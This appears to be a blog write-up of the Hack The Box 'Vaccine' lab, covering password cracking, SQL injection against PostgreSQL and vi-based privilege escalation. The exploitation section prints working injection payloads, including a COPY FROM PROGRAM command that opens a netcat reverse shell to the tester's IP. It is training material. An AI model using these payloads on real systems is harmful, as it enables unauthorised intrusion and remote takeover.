---
title:  "Vaccine - Penetration Testing Write-Up"
layout: post
---

# Vaccine – Penetration Testing Write-Up

## Introduction

Write-up number 2, here we go! This one was a little more in depth than the last and I felt the intended paths were shorter and lot more frequent. HTB wanted us to look at the tool `sqlmap` but this is an automated exploitation tool which is not allowed on the OSCP, I spent quite some time exploring the different methods to exploit vulnerable postgres servers and learned a lot along the way!

---

## Information Gathering

### Target Discovery

Here we started with a basic nmap scan `nmap -sC -sV {target_ip}`
![](https://i.imgur.com/y9S4MaQ.png)


### Service Enumeration

It does look like we have a few services open
21 - FTP with Anonymous login allowed
22 - SSH
80 - HTTP with an Apache server running


---

## Enumeration

### Port 80 - HTTP
Looks like we are greeted with a login page. I tried a few basic credentials, simple sql injection (because of the boxes tags), and took a look at the cookies. Nothing I want to spend a ton of time on just yet.
![](https://i.imgur.com/QbHWQiU.png)

### Port 21 - FTP

Something a little more interesting, and most likely the intended pathway. If you ignore me trying to learn `tnftp` we're greeted with a backup.zip file. Lets check it out!
![](https://i.imgur.com/8EYumjz.png)

It looks like we are going to need to crack the password (the tags again).
![](https://i.imgur.com/TvQfYed.png)

After some research, for us to use John The Ripper on a zip file, we're going to need to get the hash that we're going to crack using another tool called `zip2john`
![](https://i.imgur.com/PKP5EKh.png)

With the new file, we can pass that into John The Ripper and quickly find the password to the zip file.
![](https://i.imgur.com/B0yRIut.png)

We're greeted with two files, a PHP files and a stylesheet. I'll be honest, I didn't even look at the css file. 
But here is something interesting, from the PHP file, this looks like the login portal we saw earlier and the program is checking to see if the md5 of the password submitted equals a specific hash. Let's bring our new friend back out!
![](https://i.imgur.com/JtPgtuR.png)

I set the formatting to md5 and a file with hash and no other arguments. This session stopped after a few minutes. I probably could have checked against another word list or something else. But I saw the opportunity to use my main rig, for cracking this.
![](https://i.imgur.com/dbiPW4U.png)

I used hashcat in the past, but it's been a while. So I downloaded that, and the rockyou password list, after about 1.5 ms, we found the password!
![](https://i.imgur.com/HWu6bDy.png)


---

## Exploitation

Now, one of the tags was sql injection, this page only has a single search field. I could have scanned with gobuster or burp, but this seemed like the intended path.
![](https://i.imgur.com/EIRFx7s.png)

The tasks for this box wanted us to use `sqlmap` but, that is a auto-exploiting tool and will get your test thrown out if you use it on the OSCP. Additionally, sql injection seems like a valuable skill to hone early on. I spent quite a bit of time on learning the different methods to do this. In particular the [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings) Repo was a huge help and so was [OWASP's](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection) guide!

Eventually, after *some* trial and error, was able to get confirmation that the site was vulnerable to sql injection with this command. 
```
http://10.129.193.163/dashboard.php?search=elixir' UNION SELECT 1, version(), 't', 't', 't'--
```

Which gave me the output:
```
PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008, 64-bit
```


I moved on to enumerating different directories to find some information, here I was able to identify the user flag, as well as an ssh key.
```
http://10.129.193.163/dashboard.php?search=elixir' UNION SELECT 1, pg_ls_dir('../../'), 't', 't', 't'--
```

![](https://i.imgur.com/Fc9IZ8I.png)

Unfortunately, I was not able to ssh in this way. So I had to dig a bit deeper.
![](https://i.imgur.com/UWoyXEZ.png)

About now, is when I started to really understand what I was doing with the union based injection and again, thanks to PayloadAllTheThings, I was able to establish a reverse shell with netcat and the two following commands.
```
http://10.129.193.163/dashboard.php?search=elixir'; CREATE TABLE shell(output text);--

http://10.129.193.163/dashboard.php?search=elixir'; COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.190 1337 >/tmp/f';--
```

---

## Privilege Escalation

Just like that, we were to establish a reverse shell to the postgres user. This shell was really finicky. The connection closed frequently, it wasn't fully interactive, every time it closed I had to use the last sql injection. I tried to do a few things to get a foothold, I tried to get new ssh keys and change the permissions, run linpeas, and a few other methods. Eventually, I did some more digging and and found credentials for the postgres user.
![](https://i.imgur.com/YrzRyga.png)

This allowed me to ssh in as postgres and establish a clean foothold as well as continue my priv esc. The next task hinted at programs the postgres user can run as root using sudo. I've delt with something like this in the past, and after a couple quick google searches, using the command `sudo -l` lists exactly this. Here we were able to identify that the postgres user can run sudo for the program vi, but on on the `pg_nba.conf` file.
![](https://i.imgur.com/0QMw5U9.png)

although linpeas was not working in the netcat shell very well, it may have been helpful to point me at the vi exploit here. However, after a bit of searching around, I and later learned in the write up, about the repository https://gtfobins.github.io/ (as well as https://lolbas-project.github.io/# for windows) which contains privilege escalation techniques and so much more for out of the box programs. After a bit of trial and error. I was able to escalate my privileges by using the command 
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Followed by the commands described in the vi exploit:
```bash
:set shell=/bin/sh
:shell
```

This gave me a root shell, and I was able to quickly snag the root flag.
![](https://i.imgur.com/R35iaBH.png)

---

## Outcome

Thank you for taking to time to read, or at least skim through this post. This box took some time, but I learned quite a bit along the way. Skipping `sqlmap` allowed me to deep dive into different techniques for sql injection. I also had no idea how many privilege escalation techniques there were. During this time I also tried out a more structured note taking technique that I found from [QuirkyKirkHax](https://www.youtube.com/watch?v=gXFTM3fRqIg) that structured things in a way that I am a fan of, I think I will build and modify that as I go forward.

---

## Notes

Once again, I did want to take a look at the write up to see what I missed or anything interesting.
- We took similar routes at the beginning, they looked at the ftp server first, but they also used both John and hashcat. 
- For one they used the `hashid` program. I just assumed since we were comparing the md5 of the encrypted input the hash was going to be md5.
- The `sqlmap` seems pretty handy, and maybe more helpful as things get more complex, but it still did require some work to set up

---
